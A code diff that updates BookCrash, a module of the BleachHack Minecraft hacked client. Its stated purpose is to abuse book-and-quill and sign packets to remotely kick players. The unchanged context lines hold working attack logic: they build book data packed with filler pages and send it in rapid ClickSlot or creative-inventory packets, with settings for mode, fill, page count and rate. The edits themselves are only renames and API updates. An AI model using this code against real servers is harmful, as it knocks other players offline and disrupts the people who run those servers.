@@ -1,19 +1,10 @@
 /*
  * This file is part of the BleachHack distribution (https://github.com/BleachDrinker420/BleachHack/).
- * Copyright (c) 2019 Bleach.
+ * Copyright (c) 2021 Bleach and contributors.
  *
- * This program is free software: you can redistribute it and/or modify
- * it under the terms of the GNU General Public License as published by
- * the Free Software Foundation, either version 3 of the License, or
- * (at your option) any later version.
- *
- * This program is distributed in the hope that it will be useful,
- * but WITHOUT ANY WARRANTY; without even the implied warranty of
- * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
- * GNU General Public License for more details.
- *
- * You should have received a copy of the GNU General Public License
- * along with this program.  If not, see <http://www.gnu.org/licenses/>.
+ * This source code is subject to the terms of the GNU General Public
+ * License, version 3. If a copy of the GPL was not distributed with this
+ * file, You can obtain one at: https://www.gnu.org/licenses/gpl-3.0.txt
  */
 package bleach.hack.module.mods;
 
@@ -21,11 +12,11 @@ import java.util.Random;
 import java.util.stream.Collectors;
 import java.util.stream.IntStream;
 
-import com.google.common.eventbus.Subscribe;
+import bleach.hack.eventbus.BleachSubscribe;
 
 import bleach.hack.event.events.EventReadPacket;
 import bleach.hack.event.events.EventTick;
-import bleach.hack.module.Category;
+import bleach.hack.module.ModuleCategory;
 import bleach.hack.module.Module;
 import bleach.hack.setting.base.SettingMode;
 import bleach.hack.setting.base.SettingSlider;
@@ -50,16 +41,16 @@ public class BookCrash extends Module {
 	private int delay = 0;
 
 	public BookCrash() {
-		super("BookCrash", KEY_UNBOUND, Category.EXPLOITS, "Abuses book and quill/sign packets to remotely kick people.",
-				new SettingMode("Mode", "Jessica", "Raion", "Sign").withDesc("What method to use"),
-				new SettingSlider("Uses", 1, 20, 5, 0).withDesc("How many uses per tick"),
-				new SettingSlider("Delay", 0, 5, 0, 0).withDesc("How many ticks to wait between uses"),
-				new SettingMode("Fill", "Ascii", "0xFFFF", "Random", "Old").withDesc("How to fill the book"),
-				new SettingSlider("Pages", 1, 100, 50, 0).withDesc("How many pages to fill"),
-				new SettingToggle("Auto-Off", true).withDesc("Automatically turns the modules off when you disconnect"));
+		super("BookCrash", KEY_UNBOUND, ModuleCategory.EXPLOITS, "Abuses book and quill/sign packets to remotely kick people.",
+				new SettingMode("Mode", "Jessica", "Raion", "Sign").withDesc("What method to use."),
+				new SettingSlider("Uses", 1, 20, 5, 0).withDesc("How many uses per tick."),
+				new SettingSlider("Delay", 0, 5, 0, 0).withDesc("How many ticks to wait between uses."),
+				new SettingMode("Fill", "Ascii", "0xFFFF", "Random", "Old").withDesc("How to fill the book."),
+				new SettingSlider("Pages", 1, 100, 50, 0).withDesc("How many pages to fill."),
+				new SettingToggle("Auto-Off", true).withDesc("Automatically turns the modules off when you disconnect."));
 	}
 
-	@Subscribe
+	@BleachSubscribe
 	public void onTick(EventTick event) {
 		delay = (delay >= getSetting(2).asSlider().getValue() ? 0 : delay + 1);
 		if (delay > 0)
@@ -105,15 +96,15 @@ public class BookCrash extends Module {
 			tag.putString("title", title);
 			tag.put("pages", list);
 
-			bookObj.putSubTag("pages", list);
-			bookObj.setTag(tag);
+			bookObj.setSubNbt("pages", list);
+			bookObj.setNbt(tag);
 
 			for (int i = 0; i < getSetting(1).asSlider().getValue(); i++) {
 				if (getSetting(0).asMode().mode == 0) {
 					Int2ObjectMap<ItemStack> map = new Int2ObjectOpenHashMap<>(1);
 					map.put(0, bookObj);
 
-					mc.player.networkHandler.sendPacket(new ClickSlotC2SPacket(0, 0, 0, SlotActionType.PICKUP, bookObj, map));
+					mc.player.networkHandler.sendPacket(new ClickSlotC2SPacket(0, 0, 0, 0, SlotActionType.PICKUP, bookObj, map));
 				} else {
 					mc.player.networkHandler.sendPacket(new CreativeInventoryActionC2SPacket(0, bookObj));
 				}
@@ -125,7 +116,7 @@ public class BookCrash extends Module {
 		return new String(new char[count]).replace("\0", with);
 	}
 
-	@Subscribe
+	@BleachSubscribe
 	private void EventDisconnect(EventReadPacket event) {
 		if (event.getPacket() instanceof DisconnectS2CPacket && getSetting(5).asToggle().state)
 			setEnabled(false);
